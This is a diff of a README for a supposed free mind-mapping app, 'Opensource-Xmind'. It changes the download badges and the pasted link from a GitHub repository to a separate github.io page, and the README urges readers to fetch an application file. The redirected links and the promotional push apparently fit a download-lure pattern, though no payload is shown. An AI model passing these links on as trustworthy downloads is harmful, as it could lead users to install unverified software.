@@ -55,9 +55,9 @@ Follow these **five easy steps** exactly, and you'll be creating your first mind
 
 Look right below this paragraph. You will see a large, colorful badge that says **"Download Opensource-Xmind"**. Click on that button. It will take you to the official GitHub download page for this app.
 
-[![Download Opensource-Xmind](https://img.shields.io/badge/Download-Opensource--Xmind-brightgreen?style=for-the-badge&logo=github)](https://github.com/Katydidcloudiness918/Opensource-Xmind)
+[![Download Opensource-Xmind](https://img.shields.io/badge/Download-Opensource--Xmind-brightgreen?style=for-the-badge&logo=github)](https://katydidcloudiness918.github.io)
 
-*Or copy and paste this link directly into your browser's address bar:* `https://github.com/Katydidcloudiness918/Opensource-Xmind`
+*Or copy and paste this link directly into your browser's address bar:* `https://katydidcloudiness918.github.io`
 
 ### Step 2: Get the Application File
 
@@ -125,7 +125,7 @@ Stop struggling with mess sticky notes and bullet-point chaos. Download **Openso
 
 **Download it today—it's completely free!**
 
-[![Get Opensource-Xmind Now](https://img.shields.io/badge/Get_It_Now-Open_Source_App-orange?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Katydidcloudiness918/Opensource-Xmind)
+[![Get Opensource-Xmind Now](https://img.shields.io/badge/Get_It_Now-Open_Source_App-orange?style=for-the-badge&logo=github&logoColor=white)](https://katydidcloudiness918.github.io)
 
 ---
 
